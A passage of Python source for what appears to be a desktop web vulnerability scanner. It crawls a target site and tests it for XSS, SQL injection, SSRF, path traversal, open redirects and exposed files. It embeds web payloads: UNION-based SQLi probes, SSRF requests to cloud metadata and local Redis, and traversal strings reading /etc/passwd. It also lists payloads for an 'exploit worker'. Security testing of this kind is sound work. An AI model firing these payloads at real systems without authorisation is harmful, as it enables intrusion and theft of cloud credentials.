        # Mixed case WAF bypass
        ('<ScRiPt>alert(1)</ScRiPt>',       r'(?i)<script>alert\(1\)</script>'),
    ]

    def __init__(self, target_url, options):
        super().__init__()
        self.target_url = target_url.rstrip("/")
        self.options = options
        self._stop = False
        parsed = urllib.parse.urlparse(self.target_url)
        self.base_host = parsed.netloc
        self.base_scheme = parsed.scheme
        self._session = None
        self._visited = set()
        self._found_urls = []    # (url, params_dict, forms)
        self._http_count = 0
        self._vuln_count = 0

    def stop(self):
        self._stop = True

    # ── helpers ────────────────────────────────────────────────────────────────

    def _make_session(self):
        if not HAS_REQUESTS:
            return None
        import requests as req
        s = req.Session()
        s.headers.update({
            "User-Agent": "Mozilla/5.0 WebSecPro/2.0 Security Scanner",
            "Accept": "text/html,application/xhtml+xml,application/json,*/*;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        })
        s.verify = False          # needed for self-signed certs on test servers
        return s

    def _get(self, url, params=None, timeout=10, allow_redirects=True):
        """Fire a real GET and return (HttpEntry, requests.Response|None)."""
        if not HAS_REQUESTS or self._session is None:
            return None, None
        try:
            import requests as req
            req.packages.urllib3.disable_warnings()
        except Exception:
            pass
        try:
            t0 = time.time()
            resp = self._session.get(
                url, params=params, timeout=timeout,
                allow_redirects=allow_redirects
            )
            elapsed = int((time.time() - t0) * 1000)
            req_headers = dict(resp.request.headers)
            resp_headers = dict(resp.headers)
            body = resp.text[:65536]   # cap at 64 KB for display
            entry = HttpEntry(
                method="GET", url=resp.request.url,
                request_headers=req_headers, request_body="",
                status=resp.status_code,
                response_headers=resp_headers,
                response_body=body,
                response_time=elapsed,
            )
            self.sig_http_entry.emit(entry)
            self._http_count += 1
            return entry, resp
        except Exception as exc:
            self.sig_log.emit(f"Request error [{url}]: {exc}", "warning")
            return None, None

    def _post(self, url, data=None, timeout=10):
        if not HAS_REQUESTS or self._session is None:
            return None, None
        try:
            import requests as req
            req.packages.urllib3.disable_warnings()
        except Exception:
            pass
        try:
            t0 = time.time()
            resp = self._session.post(url, data=data, timeout=timeout, allow_redirects=False)
            elapsed = int((time.time() - t0) * 1000)
            entry = HttpEntry(
                method="POST", url=url,
                request_headers=dict(resp.request.headers),
                request_body=urllib.parse.urlencode(data) if data else "",
                status=resp.status_code,
                response_headers=dict(resp.headers),
                response_body=resp.text[:65536],
                response_time=elapsed,
            )
            self.sig_http_entry.emit(entry)
            self._http_count += 1
            return entry, resp
        except Exception as exc:
            self.sig_log.emit(f"POST error [{url}]: {exc}", "warning")
            return None, None

    def _same_host(self, url):
        try:
            return urllib.parse.urlparse(url).netloc == self.base_host
        except Exception:
            return False

    def _normalise(self, url, base):
        """Resolve relative URLs and strip fragments."""
        try:
            full = urllib.parse.urljoin(base, url)
            p = urllib.parse.urlparse(full)
            return urllib.parse.urlunparse(p._replace(fragment=""))
        except Exception:
            return None

    def _strip_params(self, url):
        p = urllib.parse.urlparse(url)
        return urllib.parse.urlunparse(p._replace(query="", fragment=""))

    def _report_vuln(self, vuln_type, severity, url, parameter, description,
                     payload="", evidence="", entry=None):
        v = VulnEntry(
            vuln_type=vuln_type, severity=severity, url=url,
            parameter=parameter, description=description,
            payload=payload, evidence=evidence, http_entry=entry,
        )
        self.sig_vuln.emit(v)
        self._vuln_count += 1
        level = "warning" if severity in ("LOW", "INFO") else "error"
        self.sig_log.emit(f"[{severity}] {vuln_type} @ {url} param={parameter}", level)

    # ── Phase 1: BFS Crawler ──────────────────────────────────────────────────

    def _crawl(self, max_pages=120):
        if not HAS_BS4:
            self.sig_log.emit("BeautifulSoup4 not installed — crawler disabled, using base URL only.", "warning")
            # Still add the base URL so vuln modules have something to work with
            parsed = urllib.parse.urlparse(self.target_url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            self._found_urls.append((self.target_url, params, []))
            self._visited.add(self.target_url)
            return

        depth_limit = self.options.get("depth", 3)
        # seed: (url, depth)
        queue = [(self.target_url, 0)]
        seen_bare = set()

        # ── seed from robots.txt ──────────────────────────────────────────────
        robots_url = f"{self.base_scheme}://{self.base_host}/robots.txt"
        _, r_robots = self._get(robots_url)
        if r_robots and r_robots.status_code == 200:
            for line in r_robots.text.splitlines():
                line = line.strip()
                if line.lower().startswith(("disallow:", "allow:", "sitemap:")):
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        val = parts[1].strip()
                        if val.startswith("http"):
                            full = val
                        else:
                            full = self._normalise(val, self.target_url)
                        if full and self._same_host(full) and full not in self._visited:
                            queue.append((full, 1))

        # ── seed from sitemap.xml ─────────────────────────────────────────────
        sitemap_url = f"{self.base_scheme}://{self.base_host}/sitemap.xml"
        _, r_sitemap = self._get(sitemap_url)
        if r_sitemap and r_sitemap.status_code == 200:
            for loc in re.findall(r'<loc>\s*(https?://[^<]+)\s*</loc>', r_sitemap.text):
                if self._same_host(loc) and loc not in self._visited:
                    queue.append((loc, 1))

        # ── BFS ──────────────────────────────────────────────────────────────
        while queue and not self._stop:
            url, d = queue.pop(0)
            bare = self._strip_params(url)
            if bare in seen_bare and "?" not in url:
                # Allow parameterised variants of same path through once
                continue
            seen_bare.add(bare)

            if url in self._visited:
                continue
            if len(self._visited) >= max_pages:
                self.sig_log.emit(f"Crawler: reached {max_pages} page limit.", "info")
                break

            self._visited.add(url)
            self.sig_progress.emit(
                min(50, int(len(self._visited) / max_pages * 50)),
                f"Crawling [{d}]: {url[:90]}"
            )
            self.sig_log.emit(f"Crawling: {url}", "info")

            entry, resp = self._get(url, allow_redirects=True)
            if resp is None:
                continue

            # Follow redirects — add final URL too
            if resp.url != url and self._same_host(resp.url):
                final = resp.url
                if final not in self._visited:
                    queue.append((final, d))

            # Collect URL parameters on whatever URL we landed on
            landed = resp.url if self._same_host(resp.url) else url
            parsed_landed = urllib.parse.urlparse(landed)
            params = dict(urllib.parse.parse_qsl(parsed_landed.query))

            ct = resp.headers.get("Content-Type", "")

            # Non-HTML resources: still record URL+params for vuln testing
            if "html" not in ct:
                self._found_urls.append((landed, params, []))
                continue

            try:
                soup = BeautifulSoup(resp.text, "html.parser")
            except Exception:
                self._found_urls.append((landed, params, []))
                continue

            # ── Collect forms ─────────────────────────────────────────────────
            forms = []
            for form in soup.find_all("form"):
                action = form.get("action") or ""
                method_f = form.get("method", "get").upper()
                action_url = self._normalise(action, landed) if action else landed
                if not action_url or not self._same_host(action_url):
                    continue
                inputs = {}
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name:
                        inputs[name] = inp.get("value") or "test"
                forms.append({"url": action_url, "method": method_f, "inputs": inputs})

            self._found_urls.append((landed, params, forms))

            if d >= depth_limit:
                continue

            # ── Harvest links ─────────────────────────────────────────────────
            new_links = set()

            # <a href>
            for tag in soup.find_all("a", href=True):
                href = tag["href"].strip()
                if href.startswith(("javascript:", "mailto:", "tel:", "#", "data:")):
                    continue
                full = self._normalise(href, landed)
                if full and self._same_host(full):
                    new_links.add(full)

            # <link href>, <script src>, <img src> — pick up more paths
            for tag in soup.find_all(["link", "script", "img"]):
                src = tag.get("href") or tag.get("src") or ""
                if src and not src.startswith(("data:", "javascript:", "#")):
                    full = self._normalise(src, landed)
                    if full and self._same_host(full):
                        new_links.add(full)

            # action attributes (buttons, forms we may have missed)
            for tag in soup.find_all(action=True):
                full = self._normalise(tag["action"], landed)
                if full and self._same_host(full):
                    new_links.add(full)

            # data-href, data-url patterns used by JS frameworks
            for tag in soup.find_all(True):
                for attr in ("data-href", "data-url", "data-src", "data-action"):
                    val = tag.get(attr, "")
                    if val and not val.startswith(("javascript:", "#")):
                        full = self._normalise(val, landed)
                        if full and self._same_host(full):
                            new_links.add(full)

            for link in new_links:
                if link not in self._visited:
                    queue.append((link, d + 1))

    # ── Phase 2: Sensitive Path Probe ─────────────────────────────────────────

    def _probe_paths(self):
        total = len(self.PROBE_PATHS)
        for i, path in enumerate(self.PROBE_PATHS):
            if self._stop:
                break
            pct = 50 + int(i / total * 15)
            self.sig_progress.emit(pct, f"Probing: {path}")
            url = self.target_url + path
            entry, resp = self._get(url, allow_redirects=False)
            if resp is None:
                continue

            sc = resp.status_code
            body = resp.text

            # Accessible sensitive files
            if sc == 200:
                # .git/config
                if ".git" in path and ("[core]" in body or "repositoryformatversion" in body):
                    self._report_vuln(
                        "Exposed .git Repository", "HIGH", url, path,
                        "Git repository metadata is publicly accessible — source code may be recoverable.",
                        evidence=body[:300], entry=entry,
                    )
                # .env
                elif ".env" in path and any(k in body for k in ("DB_", "APP_KEY", "SECRET", "PASSWORD", "API_KEY")):
                    self._report_vuln(
                        "Exposed .env File", "CRITICAL", url, path,
                        "Environment file containing credentials is publicly accessible.",
                        evidence=body[:300], entry=entry,
                    )
                # phpinfo / server info
                elif path in ("/phpinfo.php", "/info.php", "/test.php") and "phpinfo" in body.lower():
                    self._report_vuln(
                        "PHP Info Page Exposed", "MEDIUM", url, path,
                        "phpinfo() output reveals server configuration, paths, and environment variables.",
                        evidence=body[:200], entry=entry,
                    )
                # Directory listing
                elif "Index of /" in body or "<title>Index of" in body:
                    self._report_vuln(
                        "Directory Listing Enabled", "MEDIUM", url, path,
                        "Web server is configured to list directory contents.",
                        evidence=body[:300], entry=entry,
                    )
                # Admin panel accessible
                elif path in ("/admin", "/admin/", "/admin/login", "/phpmyadmin", "/wp-admin", "/wp-admin/"):
                    self._report_vuln(
                        "Admin Panel Accessible", "HIGH", url, path,
                        "Administrative interface returned HTTP 200 without authentication challenge.",
                        evidence=f"HTTP 200 on {path}", entry=entry,
                    )
                # Swagger / OpenAPI
                elif path in ("/swagger.json", "/openapi.json", "/api-docs") and (
                    "swagger" in body.lower() or "openapi" in body.lower()
                ):
                    self._report_vuln(
                        "API Documentation Exposed", "LOW", url, path,
                        "OpenAPI/Swagger spec is publicly accessible and reveals API structure.",
                        evidence=body[:200], entry=entry,
                    )
            self.sig_log.emit(f"[PROBE] {url} → {sc}", "info" if sc >= 400 else "warning")

    # ── helpers ────────────────────────────────────────────────────────────────
    def _all_testable_urls(self):
        """
        Yield (url, param_name, current_value) for every discovered
        parameterised URL. Always includes the base URL itself if it
        has query parameters. De-duplicates by (bare_url, param_name).
        """
        seen = set()
        # Always ensure the base URL is first
        base_parsed = urllib.parse.urlparse(self.target_url)
        base_params = dict(urllib.parse.parse_qsl(base_parsed.query))
        all_entries = list(self._found_urls)
        if not any(e[0] == self.target_url for e in all_entries):
            all_entries.insert(0, (self.target_url, base_params, []))

        for url, params, forms in all_entries:
            for param_name, param_val in params.items():
                key = (self._strip_params(url), param_name)
                if key in seen:
                    continue
                seen.add(key)
                yield url, param_name, param_val

    def _all_testable_forms(self):
        """Yield (form_dict) de-duplicated by (action_url, input_name)."""
        seen = set()
        for _, _, forms in self._found_urls:
            for form in forms:
                for inp_name in form["inputs"]:
                    key = (form["url"], inp_name)
                    if key in seen:
                        continue
                    seen.add(key)
                    yield form, inp_name

    # ── Phase 3: Vulnerability Modules ────────────────────────────────────────

    def _check_security_headers(self):
        """Check HTTP response headers for missing security directives."""
        if not self.options.get("modules", {}).get("headers", True):
            return
        entry, resp = self._get(self.target_url)
        if resp is None:
            return
        h = {k.lower(): v for k, v in resp.headers.items()}

        checks = [
            ("Strict-Transport-Security",  "strict-transport-security",  "MEDIUM",
             "HSTS not set — site may be downgraded to HTTP by attackers (MITM)."),
            ("X-Frame-Options",            "x-frame-options",            "MEDIUM",
             "Missing X-Frame-Options — clickjacking attacks may be possible."),
            ("X-Content-Type-Options",     "x-content-type-options",     "LOW",
             "Missing X-Content-Type-Options: nosniff — MIME-type sniffing possible."),
            ("Content-Security-Policy",    "content-security-policy",    "MEDIUM",
             "No CSP header — XSS payloads have no browser-enforced restriction."),
            ("Referrer-Policy",            "referrer-policy",            "LOW",
             "Missing Referrer-Policy — sensitive URLs may leak via Referer header."),
            ("Permissions-Policy",         "permissions-policy",         "LOW",
             "Missing Permissions-Policy — browser features unrestricted."),
        ]
        for header_name, header_key, severity, desc in checks:
            if header_key not in h:
                self._report_vuln(
                    f"Missing Security Header: {header_name}", severity,
                    self.target_url, header_name, desc,
                    evidence=f"Header '{header_name}' absent in response from {self.target_url}",
                    entry=entry,
                )

        # Server banner / technology disclosure
        server = h.get("server", "")
        if server and any(c.isdigit() for c in server):
            self._report_vuln(
                "Server Version Disclosure", "LOW", self.target_url, "Server",
                f"Server header reveals version: '{server}' — aids fingerprinting.",
                evidence=f"Server: {server}", entry=entry,
            )
        x_powered = h.get("x-powered-by", "")
        if x_powered:
            self._report_vuln(
                "Technology Disclosure (X-Powered-By)", "LOW", self.target_url, "X-Powered-By",
                f"X-Powered-By header discloses technology stack: '{x_powered}'.",
                evidence=f"X-Powered-By: {x_powered}", entry=entry,
            )

    def _check_xss(self):
        """Probe every GET parameter and form input for reflected XSS."""
        if not self.options.get("modules", {}).get("xss", True):
            return
        confirmed_params = set()  # (bare_url, param) — skip after first hit

        # ── GET parameter XSS ────────────────────────────────────────────────
        for url, param_name, _val in self._all_testable_urls():
            if self._stop:
                return
            key = (self._strip_params(url), param_name)
            if key in confirmed_params:
                continue

            # Step 1: confirm reflection with a safe unique marker
            marker = f"xssdet{id(param_name) % 99999:05d}"
            test_params = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
            test_params[param_name] = marker
            e, r = self._get(self._strip_params(url), params=test_params)
            if r is None or marker not in r.text:
                continue  # value not reflected at all

            self.sig_log.emit(f"[XSS] Reflection confirmed: {param_name}@{url}", "warning")

            # Step 2: try each payload
            for payload, pattern in self.XSS_PROBES:
                if self._stop:
                    return
                test_params[param_name] = payload
                e2, r2 = self._get(self._strip_params(url), params=test_params)
                if r2 is None:
                    continue
                if re.search(pattern, r2.text, re.IGNORECASE):
                    self._report_vuln(
                        "Reflected XSS", "HIGH",
                        self._strip_params(url), param_name,
                        f"Parameter '{param_name}' reflects JavaScript payload without sanitisation.",
                        payload=payload,
                        evidence=f"Payload pattern '{pattern}' found unescaped in response body.",
                        entry=e2,
                    )
                    confirmed_params.add(key)
                    break  # one confirmed finding per parameter is enough

        # ── Form input XSS ────────────────────────────────────────────────────
        for form, inp_name in self._all_testable_forms():
            if self._stop:
                return
            key = (form["url"], inp_name)
            if key in confirmed_params:
                continue

            # Marker probe
            marker = f"xssform{id(inp_name) % 99999:05d}"
            probe_data = dict(form["inputs"])
            probe_data[inp_name] = marker
            if form["method"] == "POST":
                e, r = self._post(form["url"], data=probe_data)
            else:
                e, r = self._get(form["url"], params=probe_data)
            if r is None or marker not in r.text:
                continue

            # Try payload
            payload = '<img src=x onerror=alert(1)>'
            probe_data[inp_name] = payload
            if form["method"] == "POST":
                e2, r2 = self._post(form["url"], data=probe_data)
            else:
                e2, r2 = self._get(form["url"], params=probe_data)
            if r2 and re.search(r'onerror=alert\(1\)', r2.text, re.IGNORECASE):
                self._report_vuln(
                    "Reflected XSS (Form)", "HIGH", form["url"], inp_name,
                    f"Form input '{inp_name}' reflects XSS payload without sanitisation.",
                    payload=payload,
                    evidence="onerror=alert(1) found unescaped in form response.",
                    entry=e2,
                )
                confirmed_params.add(key)

    def _check_sqli(self):
        """Test every GET parameter for SQL injection via error-based and boolean detection."""
        if not self.options.get("modules", {}).get("sqli", True):
            return
        sqli_payloads = [
            ("'",                              "single-quote syntax probe"),
            ("''",                             "double-quote escape test"),
            ("1 AND 1=2--",                    "boolean false test"),
            ("1 OR 1=1--",                     "OR injection test"),
            ("1 ORDER BY 100--",               "ORDER BY overcount"),
            ("1 UNION SELECT NULL--",          "UNION 1-col probe"),
            ("1 UNION SELECT NULL,NULL--",     "UNION 2-col probe"),
            ("1 UNION SELECT NULL,NULL,NULL--","UNION 3-col probe"),
            ("1' UNION SELECT @@version,NULL--","MySQL version fingerprint"),
            ("1 UNION SELECT @@version,NULL--", "MySQL version (numeric ctx)"),
        ]
        confirmed = set()

        for url, param_name, param_val in self._all_testable_urls():
            if self._stop:
                return
            key = (self._strip_params(url), param_name)
            if key in confirmed:
                continue

            bare = self._strip_params(url)
            base_params = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))

            # Two-sample baseline to average out dynamic page content (timestamps, nonces, ads)
            e1, r1 = self._get(bare, params=base_params)
            if r1 is None:
                continue
            e2, r2 = self._get(bare, params=base_params)
            if r2 is None:
                baseline_len = len(r1.text)
                baseline_variance = 0
            else:
                baseline_len = (len(r1.text) + len(r2.text)) // 2
                baseline_variance = abs(len(r1.text) - len(r2.text))

            for payload, description in sqli_payloads:
                if self._stop:
                    return
                if key in confirmed:
                    break
                test_params = dict(base_params)
                test_params[param_name] = payload
                e, r = self._get(bare, params=test_params)
                if r is None:
                    continue
                body_low = r.text.lower()

                # Error-based detection
                for err_pattern in self.SQLI_ERRORS:
                    if re.search(err_pattern, body_low):
                        self._report_vuln(
                            "SQL Injection (Error-Based)", "CRITICAL",
                            bare, param_name,
                            f"SQL error pattern detected when injecting into '{param_name}'.",
                            payload=payload,
                            evidence=f"Matched: '{err_pattern}' — {r.text[:300]}",
                            entry=e,
                        )
                        confirmed.add(key)
                        break
                if key in confirmed:
                    break

                # Boolean-based: response must differ by >20% AND more than the natural
                # variance between two clean baseline requests (avoids dynamic-page FPs)
                if "AND 1=2" in payload or "OR 1=1" in payload:
                    delta = abs(len(r.text) - baseline_len)
                    # Percentage change relative to baseline
                    pct_change = (delta / baseline_len * 100) if baseline_len > 0 else 0
                    # Only flag if: delta is large in absolute terms AND large relative to
                    # the natural baseline variance (at least 3× the variance)
                    noise_threshold = max(150, baseline_variance * 3)
                    if delta > noise_threshold and pct_change > 20:
                        self._report_vuln(
                            "SQL Injection (Boolean-Based)", "CRITICAL",
                            bare, param_name,
                            f"Response changes by {delta}B ({pct_change:.0f}%) with boolean payload — likely SQLi.",
                            payload=payload,
                            evidence=(f"Baseline avg {baseline_len}B (variance {baseline_variance}B) "
                                      f"vs payload {len(r.text)}B — Δ{delta}B ({pct_change:.0f}%)"),
                            entry=e,
                        )
                        confirmed.add(key)
                        break

    def _check_open_redirect(self):
        """Test all redirect-like parameters for unvalidated redirects."""
        if not self.options.get("modules", {}).get("idor", True):
            return
        redirect_params = {
            "next", "url", "redirect", "redirect_url", "return", "return_url",
            "goto", "destination", "target", "redir", "location", "back",
            "continue", "forward", "ref", "returnTo", "return_to", "redirectTo",
        }
        canary = "https://websecpro-canary.invalid/redir_test"
        confirmed = set()

        for url, param_name, _ in self._all_testable_urls():
            if self._stop:
                return
            if param_name.lower() not in {p.lower() for p in redirect_params}:
                continue
            bare = self._strip_params(url)
            key = (bare, param_name)
            if key in confirmed:
                continue
            base_params = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
            test_params = dict(base_params)
            test_params[param_name] = canary
            e, r = self._get(bare, params=test_params, allow_redirects=False)
            if r is None:
                continue
            if r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get("Location", "")
                if "websecpro-canary" in loc or "invalid" in loc:
                    self._report_vuln(
                        "Open Redirect", "MEDIUM", bare, param_name,
                        f"Redirect parameter '{param_name}' forwards to arbitrary external URLs.",
                        payload=canary,
                        evidence=f"HTTP {r.status_code} Location: {loc}",
                        entry=e,
                    )
                    confirmed.add(key)

    def _check_csrf(self):
        """Detect POST forms without CSRF tokens."""
        if not self.options.get("modules", {}).get("csrf", True):
            return
        csrf_names = {
            "csrf_token", "csrftoken", "_csrf", "csrf", "authenticity_token",
            "_token", "xsrf_token", "__requestverificationtoken", "_wpnonce",
        }
        csrf_header_names = {"x-csrf-token", "x-xsrf-token", "x-csrftoken"}
        reported = set()

        for url, _, forms in self._found_urls:
            for form in forms:
                if self._stop:
                    return
                if form["method"] != "POST":
                    continue
                key = (form["url"], str(sorted(form["inputs"].keys())))
                if key in reported:
                    continue

                input_names_low = {k.lower() for k in form["inputs"]}
                has_csrf_field = bool(input_names_low & csrf_names)

                # Re-fetch the form page to check for CSRF cookie / header
                e, r = self._get(form["url"])
                has_csrf_header = False
                has_csrf_cookie = False
                if r:
                    resp_hdrs_low = {k.lower() for k in r.headers}
                    has_csrf_header = bool(resp_hdrs_low & csrf_header_names)
                    cookie_names_low = {c.lower() for c in r.cookies}
                    has_csrf_cookie = any("csrf" in c or "xsrf" in c for c in cookie_names_low)

                if not has_csrf_field and not has_csrf_header and not has_csrf_cookie:
                    self._report_vuln(
                        "CSRF Token Missing", "MEDIUM", form["url"], "form",
                        f"POST form at {form['url']} has no CSRF token — state-changing requests can be forged.",
                        evidence=f"POST inputs: {list(form['inputs'].keys())} — no token field, header, or cookie found.",
                        entry=e,
                    )
                    reported.add(key)

    def _check_ssrf(self):
        """
        Test parameters that accept URLs or IPs for Server-Side Request Forgery.
        Also tests all parameters with common SSRF payloads if the module is enabled.
        """
        if not self.options.get("modules", {}).get("ssrf", True):
            return
        ssrf_param_names = {
            "url", "uri", "src", "source", "dest", "destination", "href",
            "redirect", "redirect_url", "fetch", "proxy", "request", "load",
            "path", "ref", "feed", "host", "to", "target", "image", "img",
            "file", "page", "document", "site", "download", "link",
        }
        ssrf_payloads = [
            "http://169.254.169.254/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://127.0.0.1/",
            "http://localhost/",
            "http://[::1]/",
        ]
        # Signatures that indicate successful SSRF
        ssrf_sigs = [
            "ami-id", "instance-id", "local-ipv4", "iam/security-credentials",
            "computeMetadata", "root:x:0:", "localhost", "+PONG", "redis_version",
        ]
        confirmed = set()

        for url, param_name, _ in self._all_testable_urls():
            if self._stop:
                return
            if param_name.lower() not in {p.lower() for p in ssrf_param_names}:
                continue
            bare = self._strip_params(url)
            key = (bare, param_name)
            if key in confirmed:
                continue
            base_params = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))

            for ssrf_url in ssrf_payloads:
                if self._stop:
                    return
                test_params = dict(base_params)
                test_params[param_name] = ssrf_url
                e, r = self._get(bare, params=test_params, timeout=6)
                if r is None:
                    continue
                if r.status_code == 200 and any(sig in r.text for sig in ssrf_sigs):
                    self._report_vuln(
                        "Server-Side Request Forgery (SSRF)", "CRITICAL",
                        bare, param_name,
                        f"Parameter '{param_name}' fetches internal/cloud URLs — SSRF confirmed.",
                        payload=ssrf_url,
                        evidence=f"Internal content retrieved: {r.text[:300]}",
                        entry=e,
                    )
                    confirmed.add(key)
                    break
                elif r.status_code == 200 and len(r.text) > 50:
                    # Possible — flag as medium for manual verification
                    self._report_vuln(
                        "Possible SSRF (Unconfirmed)", "MEDIUM",
                        bare, param_name,
                        f"Parameter '{param_name}' accepts URL input and returned content — verify manually.",
                        payload=ssrf_url,
                        evidence=f"HTTP 200, {len(r.text)} bytes: {r.text[:200]}",
                        entry=e,
                    )
                    confirmed.add(key)
                    break

    def _check_idor_traversal(self):
        """Test parameters for path traversal / IDOR via file-like parameter names."""
        if not self.options.get("modules", {}).get("idor", True):
            return
        file_param_names = {
            "file", "path", "dir", "page", "include", "template", "view",
            "document", "doc", "load", "read", "name", "src", "source",
            "filename", "filepath", "resource",
        }
        traversal_payloads = [
            ("../../../etc/passwd",             r"root:.*:/bin/(bash|sh|nologin)"),
            ("..%2F..%2F..%2Fetc%2Fpasswd",     r"root:.*:/bin/(bash|sh|nologin)"),
            ("....//....//....//etc/passwd",     r"root:.*:/bin/(bash|sh|nologin)"),
            ("../../../etc/hosts",              r"(localhost|127\.0\.0\.1)"),
            ("../../../windows/win.ini",        r"\[fonts\]"),
            ("..\\..\\..\\windows\\win.ini",    r"\[fonts\]"),
            ("/etc/passwd",                     r"root:.*:/bin/(bash|sh|nologin)"),
        ]
        confirmed = set()

        for url, param_name, _ in self._all_testable_urls():
            if self._stop:
                return
            if param_name.lower() not in {p.lower() for p in file_param_names}:
                continue
            bare = self._strip_params(url)
            key = (bare, param_name)
            if key in confirmed:
                continue
            base_params = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))

            for payload, pattern in traversal_payloads:
                if self._stop:
                    return
                test_params = dict(base_params)
                test_params[param_name] = payload
                e, r = self._get(bare, params=test_params, timeout=8)
                if r is None:
                    continue
                if r.status_code == 200 and re.search(pattern, r.text):
                    self._report_vuln(
                        "Path Traversal (IDOR)", "HIGH",
                        bare, param_name,
                        f"Parameter '{param_name}' is vulnerable to directory traversal.",
                        payload=payload,
                        evidence=f"File content found in response: {r.text[:300]}",
                        entry=e,
                    )
                    confirmed.add(key)
                    break

    def _check_sensitive_data(self):
        """Look for passwords/secrets in API JSON responses."""
        sensitive_keys = re.compile(
            r'\b(password|passwd|pass|secret|api_key|apikey|access_token|'
            r'auth_token|private_key|credit_card|ssn|social_security)\b',
            re.IGNORECASE
        )
        reported = set()
        for url, params, _ in self._found_urls:
            if self._stop:
                return
            if "api" not in url and ".json" not in url:
                continue
            bare = self._strip_params(url)
            if bare in reported:
                continue
            e, r = self._get(url, params=params)
            if r is None:
                continue
            ct = r.headers.get("Content-Type", "")
            if "json" not in ct:
                continue
            try:
                data = json.loads(r.text)
                flat = json.dumps(data)
            except Exception:
                flat = r.text
            matches = sensitive_keys.findall(flat)
            if matches:
                unique = list(dict.fromkeys(m.lower() for m in matches))[:5]
                self._report_vuln(
                    "Sensitive Data in API Response", "HIGH", bare, ",".join(unique),
                    f"API endpoint returns fields that appear to contain sensitive data: {unique}.",
                    evidence=flat[:400], entry=e,
                )
                reported.add(bare)

    # ── Main run loop ──────────────────────────────────────────────────────────

    def run(self):
        try:
            self._run_scan()
        except Exception as e:
            self.sig_log.emit(f"Scan error: {e}", "error")
            self.sig_done.emit("Scan failed")

    def _run_scan(self):
        if not HAS_REQUESTS:
            self.sig_log.emit("'requests' library not installed — cannot run real scan.", "error")
            self.sig_done.emit("Scan failed: install requests + beautifulsoup4")
            return

        self._session = self._make_session()
        self.sig_log.emit(f"▶ Real scan starting: {self.target_url}", "info")

        # ── Phase 1: Crawl ────────────────────────────────────────────────────
        if self.options.get("modules", {}).get("crawl", True) or True:
            self.sig_log.emit("Phase 1: Web crawler", "info")
            depth = self.options.get("depth", 3)
            max_pages = max(40, depth * 40)   # depth=1→40, depth=3→120, depth=5→200
            self._crawl(max_pages=max_pages)

        if self._stop:
            self.sig_done.emit("Scan stopped by user.")
            return

        # ── Phase 2: Probe sensitive paths ────────────────────────────────────
        self.sig_log.emit("Phase 2: Sensitive path discovery", "info")
        self._probe_paths()

        if self._stop:
            self.sig_done.emit("Scan stopped by user.")
            return

        # Ensure base URL is always in the found list for header checks etc.
        parsed_base = urllib.parse.urlparse(self.target_url)
        base_params = dict(urllib.parse.parse_qsl(parsed_base.query))
        if not self._found_urls:
            self._found_urls.append((self.target_url, base_params, []))

        # ── Phase 3: Vulnerability modules ────────────────────────────────────
        modules = [
            ("Security Headers",     self._check_security_headers, 65),
            ("XSS Detection",        self._check_xss,              72),
            ("SQL Injection",        self._check_sqli,             80),
            ("Open Redirect",        self._check_open_redirect,    85),
            ("CSRF Detection",       self._check_csrf,             89),
            ("SSRF Detection",       self._check_ssrf,             93),
            ("Path Traversal/IDOR",  self._check_idor_traversal,   96),
            ("Sensitive Data",       self._check_sensitive_data,   98),
        ]
        for name, fn, pct in modules:
            if self._stop:
                break
            self.sig_log.emit(f"Phase 3: {name}", "info")
            self.sig_progress.emit(pct, f"Testing {name}...")
            fn()

        self.sig_progress.emit(100, "Done")
        summary = (
            f"Scan complete — {self._http_count} requests, "
            f"{self._vuln_count} vulnerabilities found across "
            f"{len(self._visited)} pages"
        )
        self.sig_done.emit(summary)


# ─── REAL EXPLOIT WORKER ──────────────────────────────────────────────────────
class ExploitWorker(QThread):
    """
    Fires real HTTP requests to confirm and demonstrate vulnerabilities.
    Each vuln type has a tailored payload sequence; responses are inspected
    to determine success — no randomness or mock results.
    """
    sig_output = pyqtSignal(str, str)   # text, level
    sig_done   = pyqtSignal(bool, str)  # success, summary

    # XSS payloads with detection patterns
    XSS_PAYLOADS = [
        ('<script>alert(1)</script>',       r'<script>alert\(1\)</script>'),
        ('<img src=x onerror=alert(1)>',    r'onerror=alert\(1\)'),
        ('"><svg/onload=alert(1)>',         r'onload=alert\(1\)'),
        ('<details open ontoggle=alert(1)>', r'ontoggle=alert\(1\)'),
        ("'><script>alert(1)</script>",     r'<script>alert\(1\)</script>'),
        ('<ScRiPt>alert(1)</ScRiPt>',       r'<script>alert\(1\)</script>'),
        ('%3Cscript%3Ealert(1)%3C/script%3E', r'<script>alert\(1\)</script>'),
    ]

    # SQLi payloads: (payload, error_pattern, description)
    SQLI_PAYLOADS = [
        ("'",                        r"(sql syntax|quoted string|syntax error|ORA-\d)", "Single quote — error injection"),
        ("''",                       r"(sql syntax|quoted string|syntax error)",         "Double quote escape test"),
        ("1 AND 1=1--",              r"",                                                "Boolean true — baseline"),
        ("1 AND 1=2--",              r"",                                                "Boolean false — behavioural diff"),
        ("1 ORDER BY 100--",         r"(sql syntax|unknown column|order by)",            "ORDER BY overcount — error based"),
        ("1 UNION SELECT NULL--",    r"(union|sql syntax|all queries combined)",         "UNION NULL probe"),
        ("1 UNION SELECT NULL,NULL--", r"(union|sql syntax)",                            "UNION 2-col probe"),
        ("1 UNION SELECT NULL,NULL,NULL--", r"(union|sql syntax)",                      "UNION 3-col probe"),
        ("1' UNION SELECT @@version,NULL--", r"(mysql|mariadb|\d+\.\d+\.\d+)",          "MySQL version extraction"),
    ]

    # SSRF targets
    SSRF_TARGETS = [
        ("http://169.254.169.254/",                             "AWS/GCP metadata root"),
        ("http://169.254.169.254/latest/meta-data/",            "AWS EC2 metadata"),
        ("http://169.254.169.254/latest/meta-data/hostname",    "EC2 hostname"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        ("http://127.0.0.1/",                                   "Localhost loopback"),
        ("http://127.0.0.1:6379/",                              "Redis probe"),
        ("http://127.0.0.1:8080/",                              "Internal HTTP probe"),
    ]

